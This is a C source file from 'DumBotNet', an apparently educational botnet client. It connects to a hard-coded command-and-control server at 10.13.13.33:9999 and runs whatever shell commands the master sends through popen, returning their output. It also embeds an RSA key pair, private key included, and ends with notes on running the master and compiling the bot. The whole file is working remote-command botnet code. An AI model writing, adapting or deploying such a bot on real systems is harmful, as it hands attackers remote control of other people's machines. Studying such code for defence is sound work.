/*
 * This file is part of DumBotNet.
 * Copyright (c) David Martinez Oliveira 2016
 *
 * DumBotNet is free software: you can redistribute
 * it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3
 * of the License, or (at your option) any later version.
 *
 * DumBotNet is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with DumBotNet.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <stdio.h>

#define CC_SERVER "10.13.13.33"
#define CC_PORT 9999
#define MAX_BUF 1024

#define PEXIT(str) {perror (str);exit(1);}

// ======================= VARIABLES =======================

// Variable used as Bot identifier
static char *bot_id = NULL;

// Encrypted and decrypted variables are used to validate the message
int encrypted_size = 0;
int decrypted_size = 0;

// Variable used by the RSA encryption/decryption method
int padding = RSA_PKCS1_PADDING;

// TEMPORAL VARIABLE
char plainText[2048/8] = "HELLO, THIS IS FREDDY IN MAYUS.";

// The following corresponds to the zergserver public key
char publicKey[]="-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAviMBq0s1iNpF724awL4y\n"\
"JW9gdqSy8MPXpWVCTZwEGD+ASxAGSYv+KUkkhPtxPRPfxWHOX9dTrNSPH34BKFrk\n"\
"eeTYh8m0NBOYW5os9t/fV3Ju+g3o1Av+NXIIFguyglmuic25iNnmHnCLxIKzoAPj\n"\
"Lwj7YiHOFtPjFyxjs/UB4L/89l4+TQeApVSuVTNK249fzYjWt7c8kTES1qv/dUB4\n"\
"NgG/yIAluDa24ftjzfp+nTEbhz5EtapVpm4XdL2wUrXdmZyudZO7eFzYtYa+FAfR\n"\
"cV9Vm6jBSb0VvKZV0DTKfmqRM2JbWcTcJc+FScenYuUbSCZ6reRhemlurU9XrRcS\n"\
"ewIDAQAB\n"\
"-----END PUBLIC KEY-----\n";

// The following corresponds to the bot private key
char privateKey[]="-----BEGIN RSA PRIVATE KEY-----\n"\
"MIIEowIBAAKCAQEAviMBq0s1iNpF724awL4yJW9gdqSy8MPXpWVCTZwEGD+ASxAG\n"\
"SYv+KUkkhPtxPRPfxWHOX9dTrNSPH34BKFrkeeTYh8m0NBOYW5os9t/fV3Ju+g3o\n"\
"1Av+NXIIFguyglmuic25iNnmHnCLxIKzoAPjLwj7YiHOFtPjFyxjs/UB4L/89l4+\n"\
"TQeApVSuVTNK249fzYjWt7c8kTES1qv/dUB4NgG/yIAluDa24ftjzfp+nTEbhz5E\n"\
"tapVpm4XdL2wUrXdmZyudZO7eFzYtYa+FAfRcV9Vm6jBSb0VvKZV0DTKfmqRM2Jb\n"\
"WcTcJc+FScenYuUbSCZ6reRhemlurU9XrRcSewIDAQABAoIBAAqot708mCG16tnD\n"\
"WGiZwQHsPoIoNYfd0scI6DCloG0jkjOjEFcrK/JwkUWLOwvrg03zb7hbv+sed2+S\n"\
"hsoWXlyfAayLGDkbKB1qhT7JyiGC3snR4c2RZozkeaOSwE0ibfB3wgD0BjyKnqtD\n"\
"kIJV9XR7kmwr7PvGoSJ5cJV0FMjeobWbyODbXuCLtypum/G9XNkTXUk9xLDg6yiv\n"\
"jtzdCAR+/6pAJI8mWDtRhaiKGAcjSMQQbqO9D+ruYmQjpzryrxjiftrq/MQiH2zt\n"\
"Pd2caAXCuyxqTmNI6GGUQCnk1rYQsAFQsEx6qKUwf/Aa/deqpHdY2DI7P2L+X3mR\n"\
"hvip6pECgYEA5CZ/mRk3GbvEu3XknCaBUgKsQ+9hnIz5/OpCbSzna04XFsx0RINY\n"\
"5+DPVBpqVbrTUchOsuHCVADykLgkixN63Z8Wh/15iR3fEipIAjnoWkdNJMstIMxR\n"\
"bJ0yM6IUMFJ4cUbuMDYdUk3GDAgkShWIdJIn8tGYtFJQo458HC+K37cCgYEA1Vid\n"\
"ZFs8JNzW5uCTxxIOA09gPbtwqkiqv/emgI4IuBHujQampk65VwqGtxDPhyS/n7SK\n"\
"NSSdeVrntw6tQcX+y1TbLTL97dnNYShk3NIFbl+IKVk6oVrFAx0uDfaX2afga9+V\n"\
"pCjiITJmfGthc7FjDWsRYDU+mndEzD1GTd9Qm10CgYEAtm1+K7n40A/PACIFeUJk\n"\
"t2HBwtR/VYF4Rt493TRBmxCm76jt8vafuVGOFm7ExeYMIOGs4+YWz7quOj+zoK0j\n"\
"2l/h0T1B1/zVqJ28VGNfQgivS5NWc1pMZS/Qu26G/BiFi/YucMhka7IagPZlpgNP\n"\
"x/4yCTvFAbKsHgvJe3QcdEMCgYBr7L0KJIEjYLgx6U+4d7CxCfl0oRqYedQu8le/\n"\
"VpqgiymzG7c4EEEAACov94gUJInvf4Qe6BvlZRAs8XbB/CgtsgqCLfZ42SJlUOrd\n"\
"Lj1jHV6jFCltsJ5TOfKvS5x7lcoYp+1qMuhZxMZFkIim3whtpEkQ8z5tI4KhEyo6\n"\
"gIqlXQKBgF5+an6MSi7jd8VJsA80wC+vujO/GkeAdDz3OWVHDyWSVP/q8cauNOy1\n"\
"86RHWuzCaXPeIycnd2AeQjmPfAztKWF702K+aUHolhQI6aL+X0Vw8X1o3xWb2du3\n"\
"BcqT/H0KMxrpv2MbiLBewgsQJu3vbgVKYED833C1eyWMMP+Mzp2v\n"\
"-----END RSA PRIVATE KEY-----\n";

// ======================= METHODS =======================

// ===== BOT "bot_print" =====
// Method to print in the bot console
int bot_print (int s, char *str){
  return write (s, str, strlen(str));
}


// ===== BOT "bot_read" =====
// Method to catch the instruction written by the master
int bot_read (int s, char *msg){
  memset (msg, 0, MAX_BUF);
  if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");

  return 0;
}


// ===== BOT "bot_run_cmd" =====
// Method to execute the command; prints in the console of master the result
int bot_run_cmd (int s, char *cmd){
  char  line[1024];
  FILE *f = popen (cmd,"r");

  if (!f) return -1;
  while (!feof (f)){
      if (!fgets (line, 1024, f)) break;
      bot_print (s, ">>>");
      bot_print (s, bot_id);
      bot_print (s, ": ");
      bot_print (s, line);
  }
  fclose(f);

  return 0;
}


// ===== BOT "bot_parse" =====
// Method to extract the target and command
int bot_parse (int s, char *msg){
  char *target = msg;
  char *cmd = NULL;

  if ((cmd = strchr (msg, ':')) == NULL){
      printf ("!! Malformed command. Should be TARGET:command\n");
      return -1;
  }

  *cmd = 0;
  cmd++;
  cmd[strlen(cmd) - 1] = 0;

  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
    return 0; // Silently ignore messages not for us

  printf ("+ Executing command: '%s'\n", cmd);
  bot_run_cmd (s, cmd);

  return 0;
}


// ===== BOT "bot_connect_cc" =====
// Method to connect to the master
int bot_connect_cc (char *ip, int port){
  char                 msg[1024];
  struct sockaddr_in   server;
  int                  s;
  
  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if ((s = socket (PF_INET, SOCK_STREAM, 0)) < 0) 
    PEXIT ("socket:");
  if ((connect (s, (struct sockaddr*) &server, sizeof(server))) < 0) 
    PEXIT ("conect:");
  snprintf (msg, 1024, ">>>%s: This is '%s' Up and Running\n", bot_id, bot_id);
  bot_print (s, msg);

  return s;
}


// ===== RSA "createRSA" =====
// Method used by the RSA encryption/decryption method
RSA * createRSA(unsigned char * key,int public)
{
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}



// ===== RSA "public_encrypt" =====
// Method used by the RSA method to encrypt using the public key
int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
{
    RSA * rsa = createRSA(key,1);
    int result = RSA_public_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}


// ===== RSA "private_decrypt" =====
// Method used by the RSA method to decrypt using the private key
int private_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted)
{
    RSA * rsa = createRSA(key,0);
    int  result = RSA_private_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}
 

// ===== RSA "private_encrypt" =====
// Method used by the RSA method to encrypt using the private key
int private_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
{
    RSA * rsa = createRSA(key,0);
    int result = RSA_private_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}


// ===== RSA "public_decrypt" =====
// Method used by the RSA method to decrypt using the public key
int public_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted)
{
    RSA * rsa = createRSA(key,1);
    int  result = RSA_public_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}


// ===== RSA "printLastError" =====
// Method used by the RSA method to print the last error ocurred
void printLastError(char *msg)
{
    char * err = malloc(130);;
    ERR_load_crypto_strings();
    ERR_error_string(ERR_get_error(), err);
    printf("%s ERROR: %s\n",msg, err);
    free(err);
}




// ===== BOT "main" =====
// Main Method. An infinitive loop is created to read and execute commands
int main (int argc, char* argv[]){
	
unsigned char  encrypted[4098]={};
unsigned char decrypted[4098]={};
 
// This code uses the PUBLIC key to encrypt and decrypt
int encrypted_length= public_encrypt(plainText,strlen(plainText),publicKey,encrypted);
if(encrypted_length == -1)
{
    printLastError("Public Encrypt failed ");
    exit(0);
}
printf("---Public encryption---\n");
printf("Encrypted length = %d\n",encrypted_length);
 
int decrypted_length = private_decrypt(encrypted,encrypted_length,privateKey, decrypted);
if(decrypted_length == -1)
{
    printLastError("Private Decrypt failed ");
    exit(0);
}
printf("Decrypted Text = %s\n",decrypted);
printf("Decrypted Length = %d\n",decrypted_length);
printf("\n");
 
// This code uses the PRIVATE key to encrypt and decrypt
encrypted_length= private_encrypt(plainText,strlen(plainText),privateKey,encrypted);
if(encrypted_length == -1)
{
    printLastError("Private Encrypt failed");
    exit(0);
}
printf("---Private encryption---\n");
printf("Encrypted length = %d\n",encrypted_length);
 
decrypted_length = public_decrypt(encrypted,encrypted_length,publicKey, decrypted);
if(decrypted_length == -1)
{
    printLastError("Public Decrypt failed");
    exit(0);
}
printf("Decrypted Text = %s\n",decrypted);
printf("Decrypted Length = %d\n",decrypted_length);

  char  msg[MAX_BUF]; 
  int   cc_s;

  if (argc !=2) PEXIT ("Invalid Number Of Arguments:");
  bot_id = strdup (argv[1]);
 
  printf ("'%s' joining the Zergnet\n", bot_id);
  cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
  while (1){
      bot_read (cc_s, msg);
      bot_parse (cc_s, msg);
  }
}

// ===== BOT "Ended notes" =====
// >>> To run the master:
// nk -hub -s T,9999

// >>> To run the bots (with the RSA method):
// gcc -o bot bot.c BotName -L/usr/lib -lssl -lcrypto
